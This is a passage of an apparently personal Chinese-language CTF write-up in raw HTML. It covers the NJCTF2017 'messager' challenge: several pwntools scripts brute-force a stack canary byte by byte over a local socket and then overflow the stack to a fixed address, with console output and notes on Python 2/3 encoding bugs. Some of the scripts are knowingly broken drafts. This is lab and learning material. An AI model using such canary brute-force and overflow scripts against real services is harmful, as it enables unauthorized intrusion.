retn</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leak_canary</span>():</span><br><span class=\"line\">    canary = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"built_in\">len</span>(canary) != <span class=\"number\">8</span>:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">255</span>):</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                p = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">5555</span>)</span><br><span class=\"line\">                p.recvuntil(<span class=\"string\">b&#x27;Welcome!\\n&#x27;</span>)</span><br><span class=\"line\">                payload = <span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">0x68</span>) + canary + <span class=\"built_in\">chr</span>(j)</span><br><span class=\"line\">                p.send(payload)</span><br><span class=\"line\">                msg = p.recvuntil(<span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"string\">b&#x27;received&#x27;</span> <span class=\"keyword\">in</span> msg:</span><br><span class=\"line\">                    canary += <span class=\"built_in\">chr</span>(j)</span><br><span class=\"line\">                    p.close()</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                p.close()</span><br><span class=\"line\">            <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                p.close()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(canary)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> u64(canary.ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">    canary = leak_canary()</span><br><span class=\"line\">    p = remote(<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"number\">5555</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">b&#x27;Welcome!\\n&#x27;</span>)</span><br><span class=\"line\">    payload = <span class=\"string\">b&#x27;a&#x27;</span> * (<span class=\"number\">0x68</span>) + p64(canary) + <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">8</span> + p64(<span class=\"number\">0x400bc6</span>)</span><br><span class=\"line\">    p.send(payload)</span><br><span class=\"line\">    p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\">pwn()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>问题: 这个栈的104长度好像不太对</p>\n<h2 id=\"排错\"><a href=\"#排错\" class=\"headerlink\" title=\"排错\"></a>排错</h2><p>​\t\t寄,卡在了字符怎么表示这里,然后产生了一大堆的问题,最后调试分析后发现是python2与python3版本差别,对字符串和bytes表示不同的问题,有点乱</p>\n<p>这里有一个问题,就是int怎么转byte</p>\n<p>还有就是这样的程序怎么调试呢……….</p>\n<p>还有str转bytei</p>\n<p>留念一下你写的奇葩东西</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> [<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"string\">&quot;a&quot;</span>,<span class=\"string\">&quot;b&quot;</span>,<span class=\"string\">&quot;c&quot;</span>,<span class=\"string\">&quot;d&quot;</span>,<span class=\"string\">&quot;e&quot;</span>,<span class=\"string\">&quot;f&quot;</span>]:</span><br><span class=\"line\">    <span class=\"comment\">#print(j)</span></span><br><span class=\"line\">    s = socket.socket()</span><br><span class=\"line\">    s.connect((<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">5555</span>))</span><br><span class=\"line\">    ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">    <span class=\"comment\">#j = b&quot;a&quot;*104 + j.to_bytes(1,&#x27;little&#x27;)</span></span><br><span class=\"line\">    j = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">104</span> + <span class=\"built_in\">str</span>(j).encode(<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">str</span>(j))</span><br><span class=\"line\">    s.send(j)</span><br><span class=\"line\">    <span class=\"comment\">#s.send(j.to_bytes(1,&#x27;little&#x27;))</span></span><br><span class=\"line\">    ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(ret)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t首先,应该是爆破256个数字,这个是ascii码的范围? 然后不是str,而是chr, 对应的字符</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">256</span>):</span><br><span class=\"line\">    <span class=\"comment\">#print(j)</span></span><br><span class=\"line\">    s = socket.socket()</span><br><span class=\"line\">    s.connect((<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">5555</span>))</span><br><span class=\"line\">    ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">    <span class=\"comment\">#j = b&quot;a&quot;*104 + j.to_bytes(1,&#x27;little&#x27;)</span></span><br><span class=\"line\">    j = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">104</span> + <span class=\"built_in\">chr</span>(j).encode(<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">str</span>(j))</span><br><span class=\"line\">    s.send(j)</span><br><span class=\"line\">    <span class=\"comment\">#s.send(j.to_bytes(1,&#x27;little&#x27;))</span></span><br><span class=\"line\">    ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(ret)</span><br></pre></td></tr></table></figure>\n\n\n\n<p>b’aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x00’<br>b’Message received!\\n’</p>\n<p>​\t\t然后就可以了!!! 为啥之前一直不行呢?….</p>\n<p>​\t\t还有就是break为什么break不出去呢? 当时可能就是因为是在这里一直没跳出去..所以以为一直没成功,其实成功l ,ret里明明有的,但是ret好像是bytes类型,而咱给的是字符串,所以不行. 在它前面加一个b就可以了<font color=\"red\">!if  b”Message received!” in ret:</font></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># sh = process(&quot;./messager&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh,&quot;break *0x8048e96&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">256</span>):</span><br><span class=\"line\">    <span class=\"comment\">#print(j)</span></span><br><span class=\"line\">    s = socket.socket()</span><br><span class=\"line\">    s.connect((<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">5555</span>))</span><br><span class=\"line\">    ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">    j = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">104</span> + <span class=\"built_in\">chr</span>(j).encode(<span class=\"string\">&#x27;latin-1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">str</span>(j))</span><br><span class=\"line\">    s.send(j)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        ret = s.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(ret)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"built_in\">type</span>(ret))</span><br><span class=\"line\">        <span class=\"comment\">#if &quot;Message received&quot; in ret:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>  <span class=\"string\">&quot;Message received!&quot;</span> <span class=\"keyword\">in</span> ret:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;success&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(j)</span><br><span class=\"line\">            s.close()</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t但是有时候都进去输出success了 还是不能break,这是为啥. 把这两行给注释掉就可以了….为什么???</p>\n<p>​\t\t我猜是产生报错了.an integer is required (got type bytes) 果然!! chr(j)是不行的</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>  <span class=\"string\">b&quot;Message received!&quot;</span> <span class=\"keyword\">in</span> ret:</span><br><span class=\"line\">             <span class=\"comment\">#print(&quot;success&quot;)</span></span><br><span class=\"line\">             <span class=\"comment\">#canary += chr(j)</span></span><br><span class=\"line\">             <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t各种各样编码的问题……..真的很奇怪诶…要怎么样才能避免呢?</p>\n<p>然后爆破出一位canary了之后,继续爆破,爆破完了之后就可以栈溢出了</p>\n<p><a href=\"https://e3pem.github.io/2018/09/30/NJCTF2017/\">https://e3pem.github.io/2018/09/30/NJCTF2017/</a></p>\n<p>如果正常的话,会返回messager received</p>\n<p>为啥一直爆破不成功呢,很奇怪 为什么python2就可以呢? 为什么python3不行呢……..</p>\n<p>对比一下后端接收到的看一下</p>\n<p>Python2: Message come: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcsfd &#x3D; 5</p>\n<p>success<br>this is34<br>“</p>\n<p>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>this is30<br>\\x1e<br>[*] Closed connection to 127.0.0.1 port 5555<br>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>this is31<br>\\x1f</p>\n<p>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00<br>this is32</p>\n<p>[<em>] Closed connection to 127.0.0.1 port 5555<br>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00<br>this is33<br>!<br>[</em>] Closed connection to 127.0.0.1 port 5555<br>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x00<br>this is34<br>“</p>\n<p>python3:</p>\n<p>Message come: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA””&#96;*** stack smashing detected ***: <unknown> terminated</unknown></p>\n<p>感觉这里多了点东西?是的,为什么python2这里不显示呢?</p>\n<p>这是第30个<br>\\x1e<br>[<em>] Closed connection to 127.0.0.1 port 5555<br>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>这是第31个<br>\\x1f<br>[</em>] Closed connection to 127.0.0.1 port 5555<br>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>这是第32个</p>\n<p>[<em>] Closed connection to 127.0.0.1 port 5555<br>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>这是第33个<br>!<br>[</em>] Closed connection to 127.0.0.1 port 5555<br>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>这是第34个<br>“</p>\n<p>b’AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x1f’<br>这是第31个<br>\\x1f<br>[*] Closed connection to 127.0.0.1 port 5555<br>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>b’AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ‘<br>这是第32个</p>\n<p>[<em>] Closed connection to 127.0.0.1 port 5555<br>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>b’AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!’<br>这是第33个<br>!<br>[</em>] Closed connection to 127.0.0.1 port 5555<br>[+] Opening connection to 127.0.0.1 on port 5555: Done<br>b’AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA”‘<br>这是第34个<br>“</p>\n<p>python2版本exp,这个的话,是只有io.recv()接收到了信息,才会往下执行,不然就走except了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">brute_canary</span>():</span><br><span class=\"line\">    <span class=\"keyword\">global</span> canary</span><br><span class=\"line\">    canary = <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> xrange(<span class=\"number\">256</span>): <span class=\"comment\"># 2 ** 8</span></span><br><span class=\"line\">        io = remote(<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"number\">5555</span>)</span><br><span class=\"line\">        io.recv()</span><br><span class=\"line\">        io.send(<span class=\"string\">&quot;A&quot;</span> * <span class=\"number\">104</span> + canary + <span class=\"built_in\">chr</span>(x))</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            io.recv()</span><br><span class=\"line\">            canary += <span class=\"built_in\">chr</span>(x)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;success&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;this is&quot;</span>+<span class=\"built_in\">str</span>(x))</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(x))</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span>: <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">finally</span>: io.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">    io = remote(<span class=\"string\">&quot;127.0.0.1&quot;</span>, <span class=\"number\">5555</span>)</span><br><span class=\"line\">    io.recv()</span><br><span class=\"line\">    io.send(<span class=\"string\">&quot;A&quot;</span> * <span class=\"number\">104</span> + canary + <span class=\"string\">&quot;A&quot;</span> * <span class=\"number\">8</span> + p64(<span class=\"number\">0x400BC6</span>))</span><br><span class=\"line\">    <span class=\"built_in\">print</span> io.recvline()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    brute_canary()</span><br><span class=\"line\">    pwn()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>错误的python3</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leak_canary</span>():</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">40</span>):</span><br><span class=\"line\">        io = socket.socket()</span><br><span class=\"line\">        io.connect((<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">5555</span>))</span><br><span class=\"line\">        io.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        senddata = <span class=\"string\">b&quot;A&quot;</span>*<span class=\"number\">104</span> +  <span class=\"built_in\">bytes</span>(<span class=\"built_in\">chr</span>(i),<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">        <span class=\"comment\">#print(senddata)</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;这是第&quot;</span>+<span class=\"built_in\">str</span>(i)+<span class=\"string\">&quot;个&quot;</span>)</span><br><span class=\"line\">        io.send(senddata)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            data = io.recvline()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&quot;Message received&quot;</span> <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;success&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>  <span class=\"comment\">#代表这一位已经爆破成功,跳出后进行下一位爆破</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">            io.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">    io = remote(<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">5555</span>)</span><br><span class=\"line\">    io.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(io.recvline())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    leak_canary()</span><br><span class=\"line\">    pwn()</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t首先,问题在data &#x3D; io.recvline(), 这个不行,可能是回复的没有换行符? recv就可以了! data &#x3D; io.recv(1024),然后问题和之前一样,比特字符和字符串比较不行,需要统一格式!</p>\n<p>经过修改后的</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leak_canary</span>():</span><br><span class=\"line\">    <span class=\"keyword\">global</span> canary</span><br><span class=\"line\">    canary = <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">30</span>,<span class=\"number\">35</span>):</span><br><span class=\"line\">        io = remote(<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">5555</span>)</span><br><span class=\"line\">        io.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">        io.send(<span class=\"string\">b&quot;A&quot;</span>*<span class=\"number\">104</span> +  <span class=\"built_in\">bytes</span>(<span class=\"built_in\">chr</span>(i),<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">        <span class=\"comment\">#print(senddata)</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;这是第&quot;</span>+<span class=\"built_in\">str</span>(i)+<span class=\"string\">&quot;个&quot;</span>)</span><br><span class=\"line\">  </span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            io.recv()</span><br><span class=\"line\">            canary += <span class=\"built_in\">chr</span>(x)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;success&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;this is&quot;</span>+<span class=\"built_in\">str</span>(x))</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(x))</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span>: <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">finally</span>: io.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">    io = remote(<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">5555</span>)</span><br><span class=\"line\">    io.recv</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(io.recvline())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    leak_canary()</span><br><span class=\"line\">    pwn()</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://blog.csdn.net/Alex_andra/article/details/105923008\">https://blog.csdn.net/Alex_andra/article/details/105923008</a></p>\n<p>Python2:”A” * 104 + chr(i)</p>\n<p>Python3:b”A”*104 +  bytes(chr(i),’utf-8’)</p>\n<p>为什么它们的输出不一样</p>\n<p>打印字符的编码类型看看?</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">oot@VM-<span class=\"number\">24</span>-<span class=\"number\">10</span>-ubuntu:/home/ubuntu/ctfquanwei/REPL-master/Canary/NJCTF2017_messager<span class=\"comment\"># python2</span></span><br><span class=\"line\">Python <span class=\"number\">2.7</span><span class=\"number\">.17</span> (default, Feb <span class=\"number\">27</span> <span class=\"number\">2021</span>, <span class=\"number\">15</span>:<span class=\"number\">10</span>:<span class=\"number\">58</span>)</span><br><span class=\"line\">[GCC 